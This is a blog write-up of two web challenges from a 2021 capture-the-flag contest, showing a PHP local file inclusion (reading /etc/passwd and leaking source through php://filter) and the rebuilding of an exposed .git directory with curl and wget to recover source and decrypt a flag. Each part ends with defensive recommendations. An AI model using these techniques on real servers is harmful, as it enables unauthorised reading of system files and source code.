---
title: "Digital Overdose Autumn 2021 CTF - Part 2: Web"
date: 2021-10-09
layout: single
tags:
  - CTF
  - web
---

During the weekend of 09.10 and 10.10, I participated in [Digital Overdose Autumn 2021 CTF](https://digitaloverdose.tech/ctf/2021-autumn) with [@de3ev](https://twitter.com/de3ev), [@CatieSai](https://twitter.com/CatieSai), and [@msdaniellearcon](https://twitter.com/msdaniellearcon). Our team ended up with 2361 points, and me with 15 individual solves.

![](/assets/writeups/DigitalOverdose/doctf-pidnull.png)

Here is part 2 of my writeup for the web challenges I solved for this CTF. Click [here](/2021/10/09/DigitalOverdoseCTF-Part1.html) for part 1.


As usual, my intent on writing about these challenges is to showcase my understanding of the issues presented in each challenge, and to write recommendations on how to address them.

---

## Web

Summary: there were only 3 challenges in this category, and I was able to solve 2 of them.

### notrequired

Challenge description:

> Hello I am cheemsloverboi33! I made a php website. Can you do a quick security check on it?

URL redirected to: http://ctf.bennetthackingcommunity.cf:8333/index.php?file=index.html

Instinctively, I tried to pass known OS files to see if the application was vulnerable to [Local File Inclusion](https://blog.detectify.com/2012/10/14/the-basics-of-local-file-inclusions/), and it was: 

```bash
juancho💀hackbox:notrequired$ curl http://ctf.bennetthackingcommunity.cf:8333/index.php?file=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
juancho💀hackbox:notrequired$ 
```

I then spent some time figuring out the objective. I tried searching for the `flag` file, enumerated as much files as possible (Apache config files, php.ini, Apache logs, OS config files), checked if I could get a shell with `/proc/self/environ`, and if RFI was possible using `http://` wrapper. None of these seemed to work.

I then tried to access `index.php`:

```bash
juancho💀hackbox:notrequired$ curl http://ctf.bennetthackingcommunity.cf:8333/index.php?file=index.php
<br />
<b>Fatal error</b>:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 20480 bytes) in <b>/var/www/html/index.php</b> on line <b>14</b><br />
juancho💀hackbox:notrequired$ 
```

Then I tried the php filter with base64:

```bash
juancho💀hackbox:notrequired$ curl http://ctf.bennetthackingcommunity.cf:8333/index.php?file=php://filter/convert.base64-encode/resource=index.php | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   300  100   300    0     0   1276      0 --:--:-- --:--:-- --:--:--  1276
<?php

if(!isset($_GET["file"])){
    header("location: http://ctf.bennetthackingcommunity.cf:8333/index.php?file=index.html");
    exit;
}

else{
    require($_GET['file']);
}

#note to myself: delete /bin/secrets.txt!
?>
juancho💀hackbox:notrequired$ 
```

It was a small PHP file that checks if the GET parameter "file" is not set and redirects the user to the URL accordingly.

Otherwise, it loads the file specified from the "file" GET parameter. This is a classic insecure PHP programming mistake that leads to [Local File Inclusion](https://cwe.mitre.org/data/definitions/98.html) that PHP programmers have to always keep in mind.

Downloaded the secret file and found the flag:

```bash
juancho💀hackbox:notrequired$ curl http://ctf.bennetthackingcommunity.cf:8333/index.php?file=/bin/secrets.txt
BUHC{r3qu1r3_1s_s0m3th1ng_9091029130()8112938121}juancho💀hackbox:notrequired$ 
juancho💀hackbox:notrequired$ 
```

> DO{r3qu1r3_1s_s0m3th1ng_9091029130()8112938121}

#### Recommendations

It does not sit well with me that anyone would use the GET parameter for the filename, instead of the URL itself.

But let's say it's an absolute must. At the minimum, sanitize user input before passing to the `require()` (or `require `) statement. It would also help if the path can be specified:

```php
...
else{
    require('./webfiles/' . $_GET['file']);
}
...
```

Also, comments are useful to complement code readability, but sometimes leaving sensitive information in them can have security implications. With that, always check source code comments for unnecessary information and clean them up accordingly.

### git commit -m "whatever"

Challenge description:

> Visit the website

So I did:

```bash
juancho💀hackbox:git-commit-m-whatever$ curl http://193.57.159.27:46140
F0iPNKLmzY9GWP1Th60N87UCRCZTIHUhcYVO8m4NseE8j38j/dQgfQrDmfQmfS5q7QFQyJ2lcFb1QesJGdbhoGgRBU6k9J6jDes3TL8u
<html>
    <br>
    Only if you could see the source code.
</html>juancho💀hackbox:git-commit-m-whatever$ 
```

> F0iPNKLmzY9GWP1Th60N87UCRCZTIHUhcYVO8m4NseE8j38j/dQgfQrDmfQmfS5q7QFQyJ2lcFb1QesJGdbhoGgRBU6k9J6jDes3TL8u

Taking the hint that this might be a git-related challenge, by instict I visited /.git:

```html
juancho💀hackbox:git-commit-m-whatever$ curl http://193.57.159.27:46140/.git/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.48 (Debian) Server at 193.57.159.27 Port 46140</address>
</body></html>
juancho💀hackbox:git-commit-m-whatever
```

#### The problem

It often happens that CI and build systems fail to ensure that objects for development purposes, such as `package.json` and `.git`, do not get pushed to production servers. This is a bad practice since it is possible to recreate the git directory, exposing the source code which could be proprietary.

The HTTP 403/Forbidden return code could be an indication that directory listing was not allowed, however this does not matter because it could still be possible to access files inside the directory and recreate the files inside it, as I was able to do for this challenge.

#### Recreating .git

To do exactly that, I had to start by researching for the directory tree of git.

```bash
juancho💀hackbox:testgit$ git init
Initialized empty Git repository in /tmp/testgit/.git/
juancho💀hackbox:testgit$ echo "elow" >> README.md
juancho💀hackbox:testgit$ git add README.md && git commit -m "elow commit"
[main (root-commit) 7ab2572] elow commit
 1 file changed, 1 insertion(+)
 create mode 100644 README.md
juancho💀hackbox:testgit$ tree .git
.git
├── branches
├── COMMIT_EDITMSG
├── config
├── description
├── HEAD
├── hooks
│   ├── applypatch-msg.sample
<snip>
│   └── update.sample
├── index
├── info
│   └── exclude
├── logs
│   ├── HEAD
│   └── refs
│       └── heads
│           └── main
├── objects
│   ├── 31
│   │   └── b4eb2f33ff93d6dbcf3c5e5f7ed9e1b4bc4a63
│   ├── 7a
│   │   └── b25723ccd44c291082b01019cc1031d17ea1a2
│   ├── bf
│   │   └── b7f9c8bee26ec6b8a5aa7bc15a8e4e801636af
│   ├── info
│   └── pack
└── refs
    ├── heads
    │   └── main
    └── tags

15 directories, 25 files
juancho💀hackbox:testgit$ 
```

I then tired to access the files inside .git:

```bash
juancho💀hackbox:git-commit-m-whatever$ curl http://193.57.159.27:46140/.git/HEAD
ref: refs/heads/master
juancho💀hackbox:git-commit-m-whatever$ curl http://193.57.159.27:46140/.git/config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	ignorecase = true
	precomposeunicode = true
juancho💀hackbox:git-commit-m-whatever$ curl http://193.57.159.27:46140/.git/description
Unnamed repository; edit this file 'description' to name the repository.
juancho💀hackbox:git-commit-m-whatever$ 
```

Perfect! Based on this information, I knew that the repository had the master branch. The goal of course was to extract the source code of the repository, by trying to rebuild `.git`.

The next step was to get the hash of master branch's head:

```bash
juancho💀hackbox:git-commit-m-whatever$ curl http://193.57.159.27:46140/.git/refs/heads/master
2756250c7cd2188bdf8c4cdeddc92bcbe13f1755
juancho💀hackbox:git-commit-m-whatever$ 
```

Then, create a directory tree for objects: `mkdir -p .git/objects`

This next command, I had to research to figure out how the objects are structured in git. It turns out that the 1st byte of the hash is the directory name, and the remaining are same as the filename.

Verify:

```bash
juancho💀hackbox:git-commit-m-whatever$ curl -I http://193.57.159.27:46140/.git/objects/27/56250c7cd2188bdf8c4cdeddc92bcbe13f1755
HTTP/1.1 200 OK
Date: Sat, 09 Oct 2021 20:24:37 GMT
Server: Apache/2.4.48 (Debian)
Last-Modified: Fri, 08 Oct 2021 12:08:49 GMT
ETag: "8f-5cdd63dea1640"
Accept-Ranges: bytes
Content-Length: 143

juancho💀hackbox:git-commit-m-whatever$ 
```

With this, create a directory called `27`, which is the first byte in `2756250c7cd2188bdf8c4cdeddc92bcbe13f1755`, then download the object inside it:

```bash
juancho💀hackbox:git-commit-m-whatever$ mkdir .git/objects/27
juancho💀hackbox:git-commit-m-whatever$ wget http://193.57.159.27:46140/.git/objects/27/56250c7cd2188bdf8c4cdeddc92bcbe13f1755 -P .git/objects/27/
--2021-10-09 22:26:45--  http://193.57.159.27:46140/.git/objects/27/56250c7cd2188bdf8c4cdeddc92bcbe13f1755
Connecting to 193.57.159.27:46140... connected.
HTTP request sent, awaiting response... 200 OK
Length: 143
Saving to: ‘.git/objects/27/56250c7cd2188bdf8c4cdeddc92bcbe13f1755’

56250c7cd2188bdf8c4cdeddc92bcbe13f1 100%[================================================================>]     143  --.-KB/s    in 0s      

2021-10-09 22:26:46 (24.4 MB/s) - ‘.git/objects/27/56250c7cd2188bdf8c4cdeddc92bcbe13f1755’ saved [143/143]

juancho💀hackbox:git-commit-m-whatever$ ls -l .git/objects/27/56250c7cd2188bdf8c4cdeddc92bcbe13f1755
-rw-r--r-- 1 juancho juancho 143 Oct  8 14:08 .git/objects/27/56250c7cd2188bdf8c4cdeddc92bcbe13f1755
juancho💀hackbox:git-commit-m-whatever$ 
```

Now, to check the object, I knew of the command `git cat-file` but have never used it. From the help utility, I found `-t` to show the type, and `-p` to pretty-print the object based on its type.

However:

```bash
juancho💀hackbox:git-commit-m-whatever$ git cat-file -t 2756250c7cd2188bdf8c4cdeddc92bcbe13f1755
fatal: git cat-file: could not get object info
juancho💀hackbox:git-commit-m-whatever$ 
```

I researched what else are required to be in my directory tree, and found that both `HEAD` and the `refs/` directory tree should also be present, so I added those files.

```
.git/
├── HEAD
├── objects
│   └── 27
│       └── 56250c7cd2188bdf8c4cdeddc92bcbe13f1755
└── refs
    └── heads
        └── main
```

Try again:

```bash
juancho💀hackbox:git-commit-m-whatever$ git cat-file -t 2756250c7cd2188bdf8c4cdeddc92bcbe13f1755
commit
juancho💀hackbox:git-commit-m-whatever$ 
```

Then read the commit object:

```bash
juancho💀hackbox:git-commit-m-whatever$ git cat-file -p 2756250c7cd2188bdf8c4cdeddc92bcbe13f1755
tree c2c1d8bde15fa2174d6acd1284d7251579b8a1b4
author elliot <macuser@Macs-MacBook-Air.local> 1633254410 +0530
committer elliot <macuser@Macs-MacBook-Air.local> 1633254410 +0530

Committed security suicide
juancho💀hackbox:git-commit-m-whatever$ 
```

And found the tree hash: `c2c1d8bde15fa2174d6acd1284d7251579b8a1b4` in the commit hash. This is what I needed to reconstruct the files. Now, I did the same procedure:

```bash
juancho💀hackbox:git-commit-m-whatever$ mkdir .git/objects/c2
juancho💀hackbox:git-commit-m-whatever$ wget http://193.57.159.27:46140/.git/objects/c2/c1d8bde15fa2174d6acd1284d7251579b8a1b4 -P .git/objects/c2
--2021-10-09 22:40:02--  http://193.57.159.27:46140/.git/objects/c2/c1d8bde15fa2174d6acd1284d7251579b8a1b4
Connecting to 193.57.159.27:46140... connected.
HTTP request sent, awaiting response... 200 OK
Length: 268
Saving to: ‘.git/objects/c2/c1d8bde15fa2174d6acd1284d7251579b8a1b4’

c1d8bde15fa2174d6acd1284d7251579b8a 100%[================================================================>]     268  --.-KB/s    in 0s      

2021-10-09 22:40:02 (11.0 MB/s) - ‘.git/objects/c2/c1d8bde15fa2174d6acd1284d7251579b8a1b4’ saved [268/268]

juancho💀hackbox:git-commit-m-whatever$ git cat-file -t c2c1d8bde15fa2174d6acd1284d7251579b8a1b4
tree
juancho💀hackbox:git-commit-m-whatever$ git cat-file -p c2c1d8bde15fa2174d6acd1284d7251579b8a1b4
040000 tree 4fbdfd5fda330754872764810dfa2c1ef46f1bb0	Crypt
040000 tree 4979a80a4c88cdbb529b51aa231caff61d9228a0	File
040000 tree 465e79b104f83169a4f95900a6a9f42b34e71892	Math
040000 tree 3a8a916693a0d0acf0320d287318d9ddd123cbe3	Net
040000 tree 072aad170b0a780723ef2c690a3fe4f5e3392830	System
100644 blob 95d5d6fbb14df57d143ec73df6dc00807f85b1db	bootstrap.php
100644 blob 0d4096f89f4ea65a44c2a4038b6f931c95c5eba4	index.php
100644 blob 58a1261b18cc493ba5be1c4ef8f04d258716e419	openssl.cnf
juancho💀hackbox:git-commit-m-whatever$ 
```

Perfect. I could see all the files in the commit, and their hashes. I could then do the same procedure for all the files. But at this point, I was only interested with `index.php`, so I did the same steps:

```bash
juancho💀hackbox:git-commit-m-whatever$ mkdir .git/objects/0d
juancho💀hackbox:git-commit-m-whatever$ wget http://193.57.159.27:46140/.git/objects/0d/4096f89f4ea65a44c2a4038b6f931c95c5eba4 -P .git/objects/0d
--2021-10-09 22:41:48--  http://193.57.159.27:46140/.git/objects/0d/4096f89f4ea65a44c2a4038b6f931c95c5eba4
Connecting to 193.57.159.27:46140... connected.
HTTP request sent, awaiting response... 200 OK
Length: 881
Saving to: ‘.git/objects/0d/4096f89f4ea65a44c2a4038b6f931c95c5eba4’

4096f89f4ea65a44c2a4038b6f931c95c5e 100%[================================================================>]     881  --.-KB/s    in 0s      

2021-10-09 22:41:48 (28.1 MB/s) - ‘.git/objects/0d/4096f89f4ea65a44c2a4038b6f931c95c5eba4’ saved [881/881]

juancho💀hackbox:git-commit-m-whatever$ git cat-file -t 95d5d6fbb14df57d143ec73df6dc00807f85b1db
fatal: git cat-file: could not get object info
juancho💀hackbox:git-commit-m-whatever$ git cat-file -t 0d4096f89f4ea65a44c2a4038b6f931c95c5eba4
blob
juancho💀hackbox:git-commit-m-whatever$ git cat-file -p 0d4096f89f4ea65a44c2a4038b6f931c95c5eba4
<?php

/**
 * Simple sodium crypto class for PHP >= 7.2
 * @author MRK
 */
class crypto {

    /**
     * 
     * @return type
     */
    static public function create_encryption_key() {
        return base64_encode(sodium_crypto_secretbox_keygen());
    }

    /**
     * Encrypt a message
     * 
     * @param string $message - message to encrypt
     * @param string $key - encryption key created using create_encryption_key()
     * @return string
     */
    static function encrypt($message, $key) {
        $key_decoded = base64_decode($key);
        $nonce = random_bytes(
                SODIUM_CRYPTO_SECRETBOX_NONCEBYTES
        );

        $cipher = base64_encode(
                $nonce .
                sodium_crypto_secretbox(
                        $message, $nonce, $key_decoded
                )
        );
        sodium_memzero($message);
        sodium_memzero($key_decoded);
        return $cipher;
    }

    /**
     * Decrypt a message
     * @param string $encrypted - message encrypted with safeEncrypt()
     * @param string $key - key used for encryption
     * @return string
     */
    static function decrypt($encrypted, $key) {
        $decoded = base64_decode($encrypted);
        $key_decoded = base64_decode($key);
        if ($decoded === false) {
            throw new Exception('Decryption error : the encoding failed');
        }
        if (mb_strlen($decoded, '8bit') < (SODIUM_CRYPTO_SECRETBOX_NONCEBYTES + SODIUM_CRYPTO_SECRETBOX_MACBYTES)) {
            throw new Exception('Decryption error : the message was truncated');
        }
        $nonce = mb_substr($decoded, 0, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES, '8bit');
        $ciphertext = mb_substr($decoded, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES, null, '8bit');

        $plain = sodium_crypto_secretbox_open(
                $ciphertext, $nonce, $key_decoded
        );
        if ($plain === false) {
            throw new Exception('Decryption error : the message was tampered with in transit');
        }
        sodium_memzero($ciphertext);
        sodium_memzero($key_decoded);
        return $plain;
    }

}

$privatekey = "mRHpcEckKATdwDC/CwpRinDTiAYrn9lzWpTo277omKs=";

$flag = file_get_contents('../flag.txt');

$enc = crypto::encrypt($flag, $privatekey);

echo $enc;

?>

<html>
    <br>
    Only if you could see the source code.
</html>juancho💀hackbox:git-commit-m-whatever$ 
```

Awesome, that's the PHP source code for `index.php`, which includes both the functions to "encrypt" and "decrypt" the flag.

Saved to a file `found.php`, then edited to "decrypt" quickly:

```php
...
// $flag = file_get_contents('../flag.txt');

// $enc = crypto::encrypt($flag, $privatekey);

// echo $enc;

$flag = crypto::decrypt("M43+1NklRs0ctadA7hjzcsdNqtcefx8zup4hd9OfEDJ1CpOM2gNsv8t05dcLqT20/qCDB1ZWnNIOfNoGs1rIsNObC7MCStG94N06ie6m", $privatekey);

echo $flag;

?>
```

Run:

```bash
juancho💀hackbox:git-commit-m-whatever$ php found.php 
DO{y0u_d1D_1t_1908*0128123&91823182*)}juancho💀hackbox:git-commit-m-whatever$
```

> DO{y0u_d1D_1t_1908*0128123&91823182*)}

#### Recommendation

Hopefully I was able to demonstrate keeping the `.git` directory exposed for public access is a bad idea.

At the application layer, modern web frameworks such as Angular and Flask offer a level of protection since they can serve only specific URLs. However, this is not enough since there might be nested git directories.

As a security best-practice, developers and release engineers need to ensure that `.git` do not get deployed into production servers.  As an example for containerized applications using Docker, it would help to add the following to `.dockerignore`:

```
**/.git
```

The wildcard is to ignore not only `.git` in the root directory, but also any nested `.git` directories.

---

Thanks for reading my writeups!
